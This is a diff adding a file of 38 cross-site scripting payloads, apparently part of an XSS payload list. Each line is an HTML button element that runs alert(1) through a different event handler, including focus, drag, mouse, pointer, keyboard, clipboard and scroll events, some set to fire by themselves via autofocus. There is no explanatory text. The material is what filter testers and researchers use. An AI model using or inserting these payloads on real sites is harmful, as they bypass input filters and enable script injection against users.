@@ -1,0 +1,38 @@
+<button autofocus onfocus=alert(1)>test</button>
+<button autofocus onfocusin=alert(1)>test</button>
+<button contenteditable onbeforeinput=alert(1)>test
+<button draggable="true" ondrag="alert(1)" style=display:block>test</button>
+<button draggable="true" ondragend="alert(1)" style=display:block>test</button>
+<button draggable="true" ondragenter="alert(1)" style=display:block>test</button>
+<button draggable="true" ondragleave="alert(1)" style=display:block>test</button>
+<button draggable="true" ondragstart="alert(1)" style=display:block>test</button>
+<button id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></button>
+<button onafterscriptexecute=alert(1)><script>1</script>
+<button onbeforescriptexecute=alert(1)><script>1</script>
+<button onblur=alert(1) id=x tabindex=1 style=display:block>test</button><input value=clickme>
+<button onclick="alert(1)" style=display:block>test</button>
+<button oncontextmenu="alert(1)" style=display:block>test</button>
+<button oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<button oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<button ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</button>
+<button onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</button><input value=clickme>
+<button onkeydown="alert(1)" contenteditable style=display:block>test</button>
+<button onkeypress="alert(1)" contenteditable style=display:block>test</button>
+<button onkeyup="alert(1)" contenteditable style=display:block>test</button>
+<button onmousedown="alert(1)" style=display:block>test</button>
+<button onmouseenter="alert(1)" style=display:block>test</button>
+<button onmouseleave="alert(1)" style=display:block>test</button>
+<button onmousemove="alert(1)" style=display:block>test</button>
+<button onmouseout="alert(1)" style=display:block>test</button>
+<button onmouseover="alert(1)" style=display:block>test</button>
+<button onmouseup="alert(1)" style=display:block>test</button>
+<button onmousewheel=alert(1) style=display:block>requires scrolling
+<button onpointerdown=alert(1) style=display:block>XSS</button>
+<button onpointerenter=alert(1) style=display:block>XSS</button>
+<button onpointerleave=alert(1) style=display:block>XSS</button>
+<button onpointermove=alert(1) style=display:block>XSS</button>
+<button onpointerout=alert(1) style=display:block>XSS</button>
+<button onpointerover=alert(1) style=display:block>XSS</button>
+<button onpointerrawupdate=alert(1) style=display:block>XSS</button>
+<button onpointerup=alert(1) style=display:block>XSS</button>
+<button onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></button>
